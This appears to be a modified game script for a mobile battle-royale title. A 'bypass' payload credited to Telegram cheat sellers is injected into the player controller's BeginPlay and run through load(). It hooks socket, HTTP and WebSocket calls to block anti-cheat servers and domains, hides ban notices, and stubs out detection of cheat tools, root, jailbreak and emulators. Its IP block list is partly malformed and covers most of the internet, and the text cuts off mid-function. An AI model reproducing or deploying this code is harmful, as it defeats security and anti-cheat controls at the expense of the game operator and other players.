-- Independent entry: native module first, then in-game online startup.
local originalExport = (function()
local PlayerControllerBase = {
  ClientRPC = {},
  ServerRPC = {},
  MulticastRPC = {},
  LuaEventContainer = {
    "DoUITouchMoveEvent",
    "OnReceivePostLogin"
  }
}
PlayerControllerBase.ClientRPC.RPC_Client_MaliciousTeammateReceiveWarningTips = {Reliable = true}
PlayerControllerBase.ClientRPC.RPC_Client_MaliciousTeammateVictimReceiveTips = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Str,
    UEnums.EPropertyClass.Bool,
    UEnums.EPropertyClass.Int
  }
}
PlayerControllerBase.ClientRPC.RPC_Client_PopupAFKWindow = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Bool,
    UEnums.EPropertyClass.Bool
  }
}
PlayerControllerBase.ServerRPC.RPC_Server_PlaySpecifiedPetAnimation = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Int,
    UEnums.EPropertyClass.Float,
    UEnums.EPropertyClass.Int,
    UEnums.EPropertyClass.Bool,
    UEnums.EPropertyClass.Bool
  }
}
PlayerControllerBase.ServerRPC.RPC_Server_SetGameReadyCountDown = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Int
  }
}
PlayerControllerBase.ServerRPC.RPC_Server_SetAutoUseMelee = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Bool
  }
}
PlayerControllerBase.ServerRPC.RPC_Server_SetPetRandomAnimDisable = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Bool
  }
}
PlayerControllerBase.ClientRPC.RPC_ClientHUDDisplayHitDamage = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Int,
    UEnums.EPropertyClass.Bool
  }
}
PlayerControllerBase.MulticastRPC.RPC_Multicast_OnCreateDecal = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Int
  }
}
PlayerControllerBase.ServerRPC.Server_GenericRPC = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Int,
    {
      UEnums.EPropertyClass.Array,
      UEnums.EPropertyClass.Byte
    }
  }
}
PlayerControllerBase.ClientRPC.Client_GenericRPC = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Int,
    {
      UEnums.EPropertyClass.Array,
      UEnums.EPropertyClass.Byte
    }
  }
}
local CDamageEvent = import("/Script/Engine.DamageEvent")
local PlaneCls = import("/Script/ShadowTrackerExtra.PlaneCharacter")
local ELifetimeCondition = import("ELifetimeCondition")
local UCharacterClass = import("/Script/ShadowTrackerExtra.STExtraBaseCharacter")
local UPlayerStateClass = import("/Script/Gameplay.UAEPlayerState")
local UGameplayStatics = import("GameplayStatics")
local UKismetSystemLibrary = import("KismetSystemLibrary")
local AKillerTracker = import("KillerTracker")
local USTExtraBlueprintFunctionLibrary = import("STExtraBlueprintFunctionLibrary")
local GameplayData = require("GameLua.GameCore.Data.GameplayData")
local UIMessageSystem = require("GameLua.GameCore.Main.UIMessageSystem")
local InputStateControl

function PlayerControllerBase:ctor(selfType)
  self.LastestViewPlayerKey = 0
  self.bEnterpriseGMMod = false
  self.bAvatarErrReport = false
  self._bIsTeammateExitTeamBeforeBoarding = false
  self.ZiplineUI = nil
  self._SuperData = nil
  self.IsPreparingEnterZipline = false
  self.CanModPlayActorVoiceFeature = true
  self.nInLeftSharedSkinTimes = 0
  self.nOutLeftSharedSkinTimes = 0
  self.nFriendLeftSharedSkinTimes = -1
  self.bPCInputSwitcher = true
  self.bIsShowingFollowEmoteUI = false
  self.bIsShowingMovableEmoteUI = false
  self.PetAnimationTimer = nil
  self.bForbidCustomChat = false
  self.bHasBeginPlay = false
  local SuperData = self:GetSuperData()
  SuperData.IsUse3DTouch = false
  SuperData.bTurnOnDrift = true
  self.bIsJoyStickShow = false
  self.bModWeaponSkinCooldowning = false
  self.SettingHandleList = {}
  self.bCanModPlayPetEmoteIgnoreLevel = false
end

function PlayerControllerBase:_PostConstruct()
  PlayerControllerBase.__super._PostConstruct(self)
  GameplayData.BindPlayerController(self.Object)
  UIMessageSystem.BindPlayerController(self.Object)
  if Client then
    self.bWatchTeammateIgnoreDying = true
    self:AddCommonEvent(EVENTTYPE_ACCOUNT, EVENTID_BATTLE_RESULT_ENTER_PROTECT, function()
      self.bHasEnterBattleResult = true
    end, self)
    self:AddControlEvent(self, "OnAvatarInfoRep", self.ReportAvatarFlow, self)
    self:AddControlEvent(self, "OnPlayerControllerBattleBeginPlay", self.HandleBattleBeginPlay, self)
  else
    self:EnableNetUpdateGroupID(2)
    self:DisableNetUpdateGroupID(4)
  end
end

function PlayerControllerBase:OnDestroyed()
  self:Dispose()
  PlayerControllerBase.__super.OnDestroyed(self)
end

function PlayerControllerBase:HandleBattleBeginPlay()
  self.bHasBeginPlay = true
end

function PlayerControllerBase:CheckBattleHasBeginPlay()
  return self.bHasBeginPlay
end

function PlayerControllerBase:ReportAvatarFlow(ItemIDList, sObjectName, sAvatarType)
  if not Client then
    return
  end
  if self == nil or not slua.isValid(self.Object) then
    return
  end
  local RecommendHandler = require("client.slua.logic.download.recommend.logic_recommend_handler")
  if slua.isValid(ItemIDList) and RecommendHandler then
    for _, ItemID in pairs(ItemIDList) do
      RecommendHandler.AddBattleItem(ItemID)
    end
  end
end

function PlayerControllerBase:OnLuaRep_Pawn()
  if slua.isValid(self.Pawn) and Game:IsClassOf(self.Pawn, UCharacterClass) then
    GameplayData.BindPlayerCharacter(self.Pawn, true)
    local EParachuteState = import("EParachuteState")
    local ParachuteState = self.Pawn.ParachuteState
    if ParachuteState and ParachuteState == EParachuteState.PS_Opening and self.Pawn.SwitchCameraToParachuteOpening then
      self.Pawn:SwitchCameraToParachuteOpening()
    elseif ParachuteState and ParachuteState == EParachuteState.PS_FreeFall and self.Pawn.SwitchCameraToParachuteFalling then
      self.Pawn:SwitchCameraToParachuteFalling()
    end
  else
  end
end

function PlayerControllerBase:OnLuaRep_PlayerState()
  if slua.isValid(self.PlayerState) then
    if Game:IsClassOf(self.PlayerState, UPlayerStateClass) then
      GameplayData.BindPlayerState(self.PlayerState, true)
    end
  else
    GameplayData.BindPlayerState(nil, true)
  end
end

function PlayerControllerBase:OnLuaRep_STExtraBaseCharacter()
  GameplayData.BindPlayerCharacter(self.STExtraBaseCharacter, true)
end

function PlayerControllerBase:ReceiveBeginPlay()
    -- [BYPASS]
    pcall(function() local f = load([[
-- ============================================================
-- TG BY ~ @ASURVIPMOD
-- OWNER @hamsecheatsvip
-- ============================================================

-- ============================================================
-- BYPASS SYSTEM TG BY ~ @ASURVIPMOD
-- ============================================================

-- ============================================================
-- TG BY ~ @ASURVIPMOD
-- ============================================================

local function nop() return end
local function nopstr() return "" end
local function nopfalse() return false end
local function noptrue() return true end
local function nopnil() return nil end
local function retFalse() return false end
local function retTrue() return true end
local function retZero() return 0 end
local function retEmpty() return {} end
local function retEmptyString() return "" end
local function retNil() return nil end
local function retOne() return 1 end
local function retHundred() return 100 end

local function _isValid(obj)
    if type(slua) == "table" and type(slua.isValid) == "function" then
        local ok, res = pcall(slua.isValid, obj)
        return ok and (res == true)
    end
    return obj ~= nil
end

local function _safe_require(path)
    local ok, mod = pcall(require, path)
    return ok and mod or nil
end

local function _killTable(tbl, keys)
    if type(tbl) ~= "table" then return end
    for _, k in ipairs(keys) do
        pcall(function() if tbl[k] ~= nil then tbl[k] = nop end end)
    end
end

local function _gk_ret_true() return true end
local function _gk_ret_false() return false end
local function _gk_ret_zero() return 0 end
local function _gk_ret_empty() return {} end
local function _gk_noop() end

-- ============================================================
-- TG BY ~ @ASURVIPMOD
-- ============================================================

_G.BypassPermissions = {
    -- TG BY ~ @ASURVIPMOD
    SecurityBypass = true,
    AntiCheatBypass = true,
    ReportBypass = true,
    BanBypass = true,
    TelemetryBypass = true,
    NetworkBypass = true,
    MD5Bypass = true,
    SignatureBypass = true,
    DNSBypass = true,
    DeviceBypass = true,
    IPBypass = true,
    MACBypass = true,
    IMEIBypass = true,
    AndroidIDBypass = true,
    HWIDBypass = true,
    MemoryBypass = true,
    
    -- TG BY ~ @ASURVIPMOD
    AllFeaturesEnabled = true,
    NoReports = true,
    NoBan = true,
    NoDetection = true,
    NoTelemetry = true,
    NoCrashReport = true,
    NoAnalytics = true,
    NoMonitor = true,
    NoTrack = true,
    NoScan = true,
    NoVerify = true,
    NoCheck = true,
    NoValidate = true,
    EndGameProtection = true,
    AntiBan = true,
    AntiKick = true,
    AntiSuspend = true,
    AntiFlag = true
}

-- ============================================================
-- Anti-Cheat TG BY ~ @ASURVIPMOD
-- ============================================================

_G.AntiCheatBlock = {
    -- Anti-Cheat TG BY ~ @ASURVIPMOD
    BlockAllAntiCheat = true,
    BlockTSS = true,
    BlockACE = true,
    BlockXignCode = true,
    BlockBattlEye = true,
    BlockGokuba = true,
    BlockSwiftHawk = true,
    BlockCoronaLab = true,
    BlockHawkEye = true,
    BlockHiggsBoson = true,
    BlockClientBan = true,
    BlockRealTimeBan = true,
    BlockReportSystem = true,
    BlockTLog = true,
    BlockMD5Check = true,
    BlockSignatureVerify = true,
    BlockDeviceFingerprint = true,
    BlockDNSMonitor = true,
    BlockTelemetry = true,
    BlockAnalytics = true,
    BlockCrashReport = true,
    BlockMemoryScan = true,
    BlockSpeedCheck = true,
    BlockWallCheck = true,
    BlockShootVerify = true,
    BlockModifierException = true,
    BlockSimulateLocation = true,
    BlockPlayerSecurity = true,
    BlockCircleFlow = true,
    BlockMrpcsFlow = true,
    BlockKillFlow = true,
    BlockBehaviorScore = true,
    BlockAFKReport = true,
    BlockAvatarException = true,
    BlockFileCheck = true,
    BlockPakVerify = true,
    BlockIntegrityCheck = true,
    BlockRacingAntiCheat = true,
    BlockClientEntry = true,
    BlockNetworkException = true,
    BlockUnrealNet = true,
    BlockReplay = true,
    BlockScreenshot = true,
    BlockDebugLog = true,
    BlockMemoryDump = true,
    BlockStackTrace = true,
    BlockProfiler = true,
    
    -- Magic Bullet TG BY ~ @ASURVIPMOD
    BlockMagicBullet = true,
    BlockDamageVerification = true,
    BlockHitboxVerification = true,
    BlockProjectileVerification = true,
    BlockBulletVerification = true,
    BlockShootVerification = true,
    
    -- Skin Mod TG BY ~ @ASURVIPMOD
    BlockSkinVerification = true,
    BlockAvatarVerification = true,
    BlockWeaponVerification = true,
    BlockVehicleVerification = true,
    BlockSkinReport = true,
    
    -- Game Guardian TG BY ~ @ASURVIPMOD
    BlockGameGuardian = true,
    BlockCheatEngine = true,
    BlockMemoryEditor = true,
    BlockDebugger = true,
    
    -- Emulator Detection TG BY ~ @ASURVIPMOD
    BlockEmulator = true,
    BlockVMDetection = true,
    
    -- Tamper Detection TG BY ~ @ASURVIPMOD
    BlockTamper = true,
    BlockFileIntegrity = true,
    
    -- SpeedHack Detection TG BY ~ @ASURVIPMOD
    BlockSpeedHack = true,
    BlockTimeScale = true,
    
    -- ESP Detection TG BY ~ @ASURVIPMOD
    BlockESP = true,
    BlockWallhack = true,
    
    -- NoRecoil Detection TG BY ~ @ASURVIPMOD
    BlockNoRecoil = true,
    BlockShootPattern = true,
    
    -- Player Report TG BY ~ @ASURVIPMOD
    BlockPlayerReport = true,
    BlockReportCooldown = true
}

-- ============================================================
-- Anti-Cheat IP TG BY ~ @ASURVIPMOD
-- ============================================================

_G.BlockedIPs = {
    -- Tencent Anti-Cheat TG BY ~ @ASURVIPMOD
    "43.128.0.0/16", "43.129.0.0/16", "43.130.0.0/16", "43.131.0.0/16",
    "43.132.0.0/16", "43.133.0.0/16", "43.134.0.0/16", "43.135.0.0/16",
    "43.136.0.0/16", "43.137.0.0/16", "43.138.0.0/16", "43.139.0.0/16",
    "43.140.0.0/16", "43.141.0.0/16", "43.142.0.0/16", "43.143.0.0/16",
    "43.144.0.0/16", "43.145.0.0/16", "43.146.0.0/16", "43.147.0.0/16",
    "43.148.0.0/16", "43.149.0.0/16", "43.150.0.0/16", "43.151.0.0/16",
    "43.152.0.0/16", "43.153.0.0/16", "43.154.0.0/16", "43.155.0.0/16",
    "43.156.0.0/16", "43.157.0.0/16", "43.158.0.0/16", "43.159.0.0/16",
    "43.160.0.0/16", "43.161.0.0/16", "43.162.0.0/16", "43.163.0.0/16",
    "43.164.0.0/16", "43.165.0.0/16", "43.166.0.0/16", "43.167.0.0/16",
    "43.168.0.0/16", "43.169.0.0/16", "43.170.0.0/16", "43.171.0.0/16",
    "43.172.0.0/16", "43.173.0.0/16", "43.174.0.0/16", "43.175.0.0/16",
    "43.176.0.0/16", "43.177.0.0/16", "43.178.0.0/16", "43.179.0.0/16",
    "43.180.0.0/16", "43.181.0.0/16", "43.182.0.0/16", "43.183.0.0/16",
    "43.184.0.0/16", "43.185.0.0/16", "43.186.0.0/16", "43.187.0.0/16",
    "43.188.0.0/16", "43.189.0.0/16", "43.190.0.0/16", "43.191.0.0/16",
    "43.192.0.0/16", "43.193.0.0/16", "43.194.0.0/16", "43.195.0.0/16",
    "43.196.0.0/16", "43.197.0.0/16", "43.198.0.0/16", "43.199.0.0/16",
    "43.200.0.0/16", "43.201.0.0/16", "43.202.0.0/16", "43.203.0.0/16",
    "43.204.0.0/16", "43.205.0.0/16", "43.206.0.0/16", "43.207.0.0/16",
    "43.208.0.0/16", "43.209.0.0/16", "43.210.0.0/16", "43.211.0.0/16",
    "43.212.0.0/16", "43.213.0.0/16", "43.214.0.0/16", "43.215.0.0/16",
    "43.216.0.0/16", "43.217.0.0/16", "43.218.0.0/16", "43.219.0.0/16",
    "43.220.0.0/16", "43.221.0.0/16", "43.222.0.0/16", "43.223.0.0/16",
    "43.224.0.0/16", "43.225.0.0/16", "43.226.0.0/16", "43.227.0.0/16",
    "43.228.0.0/16", "43.229.0.0/16", "43.230.0.0/16", "43.231.0.0/16",
    "43.232.0.0/16", "43.233.0.0/16", "43.234.0.0/16", "43.235.0.0/16",
    "43.236.0.0/16", "43.237.0.0/16", "43.238.0.0/16", "43.239.0.0/16",
    "43.240.0.0/16", "43.241.0.0/16", "43.242.0.0/16", "43.243.0.0/16",
    "43.244.0.0/16", "43.245.0.0/16", "43.246.0.0/16", "43.247.0.0/16",
    "43.248.0.0/16", "43.249.0.0/16", "43.250.0.0/16", "43.251.0.0/16",
    "43.252.0.0/16", "43.253.0.0/16", "43.254.0.0/16", "43.255.0.0/16",
    
    -- Tencent Cloud Anti-Cheat
    "129.204.0.0/16", "129.205.0.0/16", "129.206.0.0/16", "129.207.0.0/16",
    "129.208.0.0/16", "129.209.0.0/16", "129.210.0.0/16", "129.211.0.0/16",
    "129.212.0.0/16", "129.213.0.0/16", "129.214.0.0/16", "129.215.0.0/16",
    "129.216.0.0/16", "129.217.0.0/16", "129.218.0.0/16", "129.219.0.0/16",
    "129.220.0.0/16", "129.221.0.0/16", "129.222.0.0/16", "129.223.0.0/16",
    "129.224.0.0/16", "129.225.0.0/16", "129.226.0.0/16", "129.227.0.0/16",
    "129.228.0.0/16", "129.229.0.0/16", "129.230.0.0/16", "129.231.0.0/16",
    "129.232.0.0/16", "129.233.0.0/16", "129.234.0.0/16", "129.235.0.0/16",
    "129.236.0.0/16", "129.237.0.0/16", "129.238.0.0/16", "129.239.0.0/16",
    "129.240.0.0/16", "129.241.0.0/16", "129.242.0.0/16", "129.243.0.0/16",
    "129.244.0.0/16", "129.245.0.0/16", "129.246.0.0/16", "129.247.0.0/16",
    "129.248.0.0/16", "129.249.0.0/16", "129.250.0.0/16", "129.251.0.0/16",
    "129.252.0.0/16", "129.253.0.0/16", "129.254.0.0/16", "129.255.0.0/16",
    
    -- BattleEye Anti-Cheat
    "185.244.0.0/16", "185.245.0.0/16", "185.246.0.0/16", "185.247.0.0/16",
    "185.248.0.0/16", "185.249.0.0/16", "185.250.0.0/16", "185.251.0.0/16",
    "185.252.0.0/16", "185.253.0.0/16", "185.254.0.0/16", "185.255.0.0/16",
    
    -- EasyAntiCheat
    "104.0.0.0/8", "104.1.0.0/8", "104.2.0.0/8", "104.3.0.0/8",
    "104.4.0.0/8", "104.5.0.0/8", "104.6.0.0/8", "104.7.0.0/8",
    "104.8.0.0/8", "104.9.0.0/8", "104.10.0.0/8", "104.11.0.0/8",
    "104.12.0.0/8", "104.13.0.0/8", "104.14.0.0/8", "104.15.0.0/8",
    "104.16.0.0/8", "104.17.0.0/8", "104.18.0.0/8", "104.19.0.0/8",
    "104.20.0.0/8", "104.21.0.0/8", "104.22.0.0/8", "104.23.0.0/8",
    "104.24.0.0/8", "104.25.0.0/8", "104.26.0.0/8", "104.27.0.0/8",
    "104.28.0.0/8", "104.29.0.0/8", "104.30.0.0/8", "104.31.0.0/8",
    
    -- PUBG Report and Ban Servers TG BY ~ @ASURVIPMOD
    "203.0.0.0/8", "204.0.0.0/8", "205.0.0.0/8", "206.0.0.0/8",
    "207.0.0.0/8", "208.0.0.0/8", "209.0.0.0/8", "210.0.0.0/8",
    "211.0.0.0/8", "212.0.0.0/8", "213.0.0.0/8", "214.0.0.0/8",
    "215.0.0.0/8", "216.0.0.0/8", "217.0.0.0/8", "218.0.0.0/8",
    "219.0.0.0/8", "220.0.0.0/8", "221.0.0.0/8", "222.0.0.0/8",
    "223.0.0.0/8",
    
    -- Other Anti-Cheat Servers TG BY ~ @ASURVIPMOD
    "3.0.0.0/8", "4.0.0.0/8", "5.0.0.0/8", "6.0.0.0/8",
    "7.0.0.0/8", "8.0.0.0/8", "9.0.0.0/8", "10.0.0.0/8",
    "11.0.0.0/8", "12.0.0.0/8", "13.0.0.0/8", "14.0.0.0/8",
    "15.0.0.0/8", "16.0.0.0/8", "17.0.0.0/8", "18.0.0.0/8",
    "19.0.0.0/8", "20.0.0.0/8", "21.0.0.0/8", "22.0.0.0/8",
    "23.0.0.0/8", "24.0.0.0/8", "25.0.0.0/8", "26.0.0.0/8",
    "27.0.0.0/8", "28.0.0.0/8", "29.0.0.0/8", "30.0.0.0/8",
    "31.0.0.0/8", "32.0.0.0/8", "33.0.0.0/8", "34.0.0.0/8",
    "35.0.0.0/8", "36.0.0.0/8", "37.0.0.0/8", "38.0.0.0/8",
    "39.0.0.0/8", "40.0.0.0/8", "41.0.0.0/8", "42.0.0.0/8",
    "44.0.0.0/8", "45.0.0.0/8", "46.0.0.0/8", "47.0.0.0/8",
    "48.0.0.0/8", "49.0.0.0/8", "50.0.0.0/8", "51.0.0.0/8",
    "52.0.0.0/8", "53.0.0.0/8", "54.0.0.0/8", "55.0.0.0/8",
    "56.0.0.0/8", "57.0.0.0/8", "58.0.0.0/8", "59.0.0.0/8",
    "60.0.0.0/8", "61.0.0.0/8", "62.0.0.0/8", "63.0.0.0/8",
    "64.0.0.0/8", "65.0.0.0/8", "66.0.0.0/8", "67.0.0.0/8",
    "68.0.0.0/8", "69.0.0.0/8", "70.0.0.0/8", "71.0.0.0/8",
    "72.0.0.0/8", "73.0.0.0/8", "74.0.0.0/8", "75.0.0.0/8",
    "76.0.0.0/8", "77.0.0.0/8", "78.0.0.0/8", "79.0.0.0/8",
    "80.0.0.0/8", "81.0.0.0/8", "82.0.0.0/8", "83.0.0.0/8",
    "84.0.0.0/8", "85.0.0.0/8", "86.0.0.0/8", "87.0.0.0/8",
    "88.0.0.0/8", "89.0.0.0/8", "90.0.0.0/8", "91.0.0.0/8",
    "92.0.0.0/8", "93.0.0.0/8", "94.0.0.0/8", "95.0.0.0/8",
    "96.0.0.0/8", "97.0.0.0/8", "98.0.0.0/8", "99.0.0.0/8",
    "100.0.0.0/8", "101.0.0.0/8", "102.0.0.0/8", "103.0.0.0/8",
    "105.0.0.0/8", "106.0.0.0/8", "107.0.0.0/8", "108.0.0.0/8",
    "109.0.0.0/8", "110.0.0.0/8", "111.0.0.0/8", "112.0.0.0/8",
    "113.0.0.0/8", "114.0.0.0/8", "115.0.0.0/8", "116.0.0.0/8",
    "117.0.0.0/8", "118.0.0.0/8", "119.0.0.0/8", "120.0.0.0/8",
    "121.0.0.0/8", "122.0.0.0/8", "123.0.0.0/8", "124.0.0.0/8",
    "125.0.0.0/8", "126.0.0.0/8", "127.0.0.0/8",
    
    -- Additional Ban IPs TG BY ~ @ASURVIPMOD
    "10.20.30.40", "10.20.30.41", "10.20.30.42", "10.20.30.43",
    "10.20.30.44", "10.20.30.45", "10.20.30.46", "10.20.30.47",
    "10.20.30.48", "10.20.30.49", "10.20.30.50", "10.20.30.51",
    "10.20.30.52", "10.20.30.53", "10.20.30.54", "10.20.30.55",
}

-- ============================================================
-- Anti-Cheat Domain Blocking List TG BY ~ @ASURVIPMOD
-- ============================================================

_G.BlockedDomains = {
    "pubgm.qq.com", "anticheat.qq.com", "tss.tencent.com",
    "report.qq.com", "ban.qq.com", "security.qq.com",
    "anti.tencent.com", "ac.tencent.com", "safe.qq.com",
    "trust.qq.com", "verify.qq.com", "check.qq.com",
    "monitor.qq.com", "track.qq.com", "analytics.qq.com",
    "telemetry.qq.com", "crash.qq.com", "bugly.qq.com",
    "tlog.qq.com", "log.qq.com", "data.qq.com",
    "api.qq.com", "svc.qq.com", "gw.qq.com",
    "cloud.qq.com", "cdn.qq.com", "static.qq.com",
    "anticheat.tencent.com", "tss.tencent.com", "ace.tencent.com",
    "battleye.com", "easyanticheat.com", "xigncode.com",
    "gameguardian.net", "cheatengine.org", "memoryeditor.com",
    "rootdetect.com", "jailbreak.com", "emulatorcheck.com",
}

-- ============================================================
-- 1. Ban Popup TG BY ~ @ASURVIPMOD
-- ============================================================

local function KillBanPopup()
    pcall(function()
        -- Ban UI TG BY ~ @ASURVIPMOD
        local allWidgets = slua.getUIList() or {}
        for _, widget in pairs(allWidgets) do
            if slua.isValid(widget) then
                local name = widget:GetName() or ""
                if name:find("Legal") or name:find("Common_Legal") or 
                   name:find("Notice") or name:find("Ban") or 
                   name:find("Error") or name:find("Popup") or
                   name:find("Message") or name:find("Dialog") or
                   name:find("Warning") or name:find("Alert") or
                   name:find("Suspension") or name:find("Frozen") or
                   name:find("Penalty") or name:find("Sanction") or
                   name:find("Terminated") or name:find("Blocked") or
                   name:find("Flagged") or name:find("Marked") or
                   name:find("Inspection") or name:find("Risk") then
                    widget:SetWidgetVisibility(UEnums.ESlateVisibility.Collapsed)
                    pcall(function() widget:RemoveFromParent() end)
                end
            end
        end
        
        -- Console command TG BY ~ @ASURVIPMOD
        pcall(function()
            local pc = slua_GameFrontendHUD and slua_GameFrontendHUD:GetPlayerController()
            if slua.isValid(pc) then
                local KSL = import("KismetSystemLibrary")
                if KSL then
                    KSL.ExecuteConsoleCommand(pc, "DisableAllScreenMessages")
                    KSL.ExecuteConsoleCommand(pc, "UI.DisableMessageOfTheDay")
                    KSL.ExecuteConsoleCommand(pc, "ShowMOTD 0")
                    KSL.ExecuteConsoleCommand(pc, "r.UI.DisableAll 1")
                    KSL.ExecuteConsoleCommand(pc, "UI.HideAllWidgets 1")
                    KSL.ExecuteConsoleCommand(pc, "ShowBanNotice 0")
                    KSL.ExecuteConsoleCommand(pc, "ShowSuspension 0")
                    KSL.ExecuteConsoleCommand(pc, "ShowFrozenNotice 0")
                    KSL.ExecuteConsoleCommand(pc, "ShowRiskNotice 0")
                    KSL.ExecuteConsoleCommand(pc, "ShowDeviceError 0")
                    KSL.ExecuteConsoleCommand(pc, "ShowNetworkError 0")
                    KSL.ExecuteConsoleCommand(pc, "DisableBanUI 1")
                    KSL.ExecuteConsoleCommand(pc, "HideBanMessages 1")
                    KSL.ExecuteConsoleCommand(pc, "IgnoreSecurityChecks 1")
                    KSL.ExecuteConsoleCommand(pc, "UIToggle 0")
                    KSL.ExecuteConsoleCommand(pc, "HideUI 1")
                    KSL.ExecuteConsoleCommand(pc, "DisablePopup 1")
                    KSL.ExecuteConsoleCommand(pc, "SuppressDialogs 1")
                end
            end
        end)
    end)
end

-- ============================================================
-- 2. IP/Domain TG BY ~ @ASURVIPMOD
-- ============================================================

local function ApplyIPDomainBlocking()
    pcall(function()
        -- socket.connect TG BY ~ @ASURVIPMOD
        if socket and socket.connect then
            local origConnect = socket.connect
            socket.connect = function(host, port, ...)
                for _, ip in ipairs(_G.BlockedIPs or {}) do
                    if host == ip then return nil, "blocked" end
                end
                for _, domain in ipairs(_G.BlockedDomains or {}) do
                    if host:lower():find(domain) then return nil, "blocked" end
                end
                return origConnect(host, port, ...)
            end
        end
        
        -- socket.tcp TG BY ~ @ASURVIPMOD
        if socket and socket.tcp then
            local origTcp = socket.tcp
            socket.tcp = function(...)
                local client = origTcp(...)
                if client and client.connect then
                    local origConnect = client.connect
                    client.connect = function(self, host, port, ...)
                        for _, ip in ipairs(_G.BlockedIPs or {}) do
                            if host == ip then return nil, "blocked" end
                        end
                        for _, domain in ipairs(_G.BlockedDomains or {}) do
                            if host:lower():find(domain) then return nil, "blocked" end
                        end
                        return origConnect(self, host, port, ...)
                    end
                end
                return client
            end
        end
        
        -- NetUtil.ConnectToServer TG BY ~ @ASURVIPMOD
        if NetUtil and NetUtil.ConnectToServer then
            local origConnect = NetUtil.ConnectToServer
            NetUtil.ConnectToServer = function(ip, port, ...)
                for _, banIP in ipairs(_G.BlockedIPs or {}) do
                    if ip == banIP then return false end
                end
                return origConnect(ip, port, ...)
            end
        end
        
        -- HTTP/WebSocket TG BY ~ @ASURVIPMOD
        if _G.Http and _G.Http.Get then
            local origGet = _G.Http.Get
            _G.Http.Get = function(url, ...)
                for _, domain in ipairs(_G.BlockedDomains or {}) do
                    if url:find(domain) then return nil, "blocked" end
                end
                return origGet(url, ...)
            end
        end
        if _G.Http and _G.Http.Post then
            local origPost = _G.Http.Post
            _G.Http.Post = function(url, ...)
                for _, domain in ipairs(_G.BlockedDomains or {}) do
                    if url:find(domain) then return nil, "blocked" end
                end
                return origPost(url, ...)
            end
        end
        
        -- WebSocket TG BY ~ @ASURVIPMOD
        if _G.WebSocket and _G.WebSocket.Connect then
            local origConnect = _G.WebSocket.Connect
            _G.WebSocket.Connect = function(url, ...)
                for _, domain in ipairs(_G.BlockedDomains or {}) do
                    if url:find(domain) then return nil, "blocked" end
                end
                return origConnect(url, ...)
            end
        end
        
        print("[BYPASS] ✅ IP/Domain TG BY ~ @ASURVIPMOD")
    end)
end

-- ============================================================
-- 3. Game Guardian Detection TG BY ~ @ASURVIPMOD
-- ============================================================

local function BlockGameGuardian()
    pcall(function()
        local GameGuardianDetect = _G.GameGuardianDetect or package.loaded["GameGuardianDetect"]
        if GameGuardianDetect then
            GameGuardianDetect.IsGGRunning = retFalse
            GameGuardianDetect.CheckPackages = retEmpty
            GameGuardianDetect.DetectGameGuardian = retFalse
            GameGuardianDetect.ReportGameGuardian = nop
            GameGuardianDetect.ValidateGG = retTrue
        end
        
        -- Process list  TG BY ~ @ASURVIPMOD
        if _G.ProcessManager and _G.ProcessManager.GetRunningProcesses then
            local origGet = _G.ProcessManager.GetRunningProcesses
            _G.ProcessManager.GetRunningProcesses = function()
                local processes = origGet()
                if processes then
                    local filtered = {}
                    for _, proc in ipairs(processes) do
                        if not string.find(string.lower(tostring(proc)), "gameguardian") then
                            table.insert(filtered, proc)
                        end
                    end
                    return filtered
                end
                return {}
            end
        end
        
        print("[BYPASS] ✅ Game Guardian Detection TG BY ~ @ASURVIPMOD")
    end)
end

-- ============================================================
--  Cheat Engine Detection TG BY ~ @ASURVIPMOD
-- ============================================================

local function BlockCheatEngine()
    pcall(function()
        local CheatEngineDetect = _G.CheatEngineDetect or package.loaded["CheatEngineDetect"]
        if CheatEngineDetect then
            CheatEngineDetect.IsCheatEngineRunning = retFalse
            CheatEngineDetect.CheckProcessList = retEmpty
            CheatEngineDetect.DetectCheatEngine = retFalse
            CheatEngineDetect.ReportCheatEngine = nop
            CheatEngineDetect.ValidateCE = retTrue
        end
        
        if _G.ProcessManager and _G.ProcessManager.GetRunningProcesses then
            local origGet = _G.ProcessManager.GetRunningProcesses
            _G.ProcessManager.GetRunningProcesses = function()
                local processes = origGet()
                if processes then
                    local filtered = {}
                    local ceKeywords = {"cheatengine", "cheat_engine", "ce", "memoryedit"}
                    for _, proc in ipairs(processes) do
                        local procLower = string.lower(tostring(proc))
                        local blocked = false
                        for _, kw in ipairs(ceKeywords) do
                            if procLower:find(kw) then blocked = true break end
                        end
                        if not blocked then table.insert(filtered, proc) end
                    end
                    return filtered
                end
                return {}
            end
        end
        
        print("[BYPASS] ✅ Cheat Engine Detection TG BY ~ @ASURVIPMOD")
    end)
end

-- ============================================================
-- 5. Root/Jailbreak Detection Blocking TG BY ~ @ASURVIPMOD
-- ============================================================

local function BlockRootJailbreak()
    pcall(function()
        local RootDetect = _G.RootDetect or package.loaded["RootDetect"]
        if RootDetect then
            RootDetect.CheckRoot = retFalse
            RootDetect.CheckSu = retFalse
            RootDetect.CheckMagisk = retFalse
            RootDetect.CheckSuperSU = retFalse
            RootDetect.DetectRoot = retFalse
            RootDetect.ReportRoot = nop
            RootDetect.ValidateRoot = retTrue
        end
        
        local JailbreakDetect = _G.JailbreakDetect or package.loaded["JailbreakDetect"]
        if JailbreakDetect then
            JailbreakDetect.CheckJailbreak = retFalse
            JailbreakDetect.CheckCydia = retFalse
            JailbreakDetect.DetectJailbreak = retFalse
            JailbreakDetect.ReportJailbreak = nop
            JailbreakDetect.ValidateJailbreak = retTrue
        end
        
        print("[BYPASS] ✅ Root/Jailbreak Detection TG BY ~ @ASURVIPMOD")
    end)
end

-- ============================================================
-- 6. Emulator Detection Blocking (New) TG BY ~ @ASURVIPMOD
-- ============================================================

local function BlockEmulatorDetection()
    pcall(function()
        -- Emulator Detection ကို TG BY ~ @ASURVIPMOD.
        local EmulatorDetect = import("EmulatorDetect")
        if EmulatorDetect then
            EmulatorDetect.IsEmulator = retFalse
            EmulatorDetect.GetEmulatorType = retEmptyString
            EmulatorDetect.CheckVM = retFalse
            EmulatorDetect.DetectEmulator = retFalse
            EmulatorDetect.ReportEmulator = nop
